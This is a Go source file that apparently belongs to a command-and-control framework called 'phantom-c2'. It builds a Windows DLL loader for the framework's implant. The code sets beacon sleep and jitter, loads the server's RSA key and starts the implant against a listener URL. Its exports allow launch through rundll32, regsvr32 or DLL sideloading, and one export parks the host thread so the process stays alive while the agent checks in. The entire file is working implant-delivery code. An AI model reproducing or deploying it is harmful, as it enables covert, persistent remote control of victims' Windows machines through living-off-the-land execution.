//go:build windows

package main

/*
#include <windows.h>
*/
import "C"

import (
	"crypto/rsa"
	"strconv"

	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/implant"
)

func startAgent() {
	sleepSec, _ := strconv.Atoi(implant.SleepSeconds)
	if sleepSec <= 0 {
		sleepSec = 10
	}
	jitterPct, _ := strconv.Atoi(implant.JitterPercent)
	if jitterPct < 0 || jitterPct > 50 {
		jitterPct = 20
	}

	var serverPubKey *rsa.PublicKey
	if implant.ServerPubKey != "" {
		keyBytes, err := crypto.Base64Decode(implant.ServerPubKey)
		if err == nil {
			pub, err := crypto.PublicKeyFromBytes(keyBytes)
			if err == nil {
				serverPubKey = pub
			}
		}
	}
	if serverPubKey == nil {
		pub, err := crypto.LoadPublicKey("configs/server.pub")
		if err == nil {
			serverPubKey = pub
		}
	}
	if serverPubKey == nil {
		return
	}

	implant.Run(implant.ListenerURL, serverPubKey, sleepSec, jitterPct, implant.KillDate)
}

// Start is called via: rundll32.exe phantom.dll,Start
// Blocks so rundll32 stays alive while the agent runs.
//
//export Start
func Start() {
	startAgent()
}

// DllInstall is called via: regsvr32 /s /i phantom.dll
//
//export DllInstall
func DllInstall() {
	startAgent()
}

// DllRegisterServer is called via: regsvr32 phantom.dll or DLL sideloading.
// Must return immediately, so agent runs in a goroutine and this thread sleeps.
//
//export DllRegisterServer
func DllRegisterServer() C.HRESULT {
	go startAgent()
	// Park this thread so the host process stays alive long enough for the
	// goroutine to register with the C2 and enter its check-in loop.
	C.Sleep(C.DWORD(0xFFFFFFFF))
	return 0 // S_OK
}

func main() {}
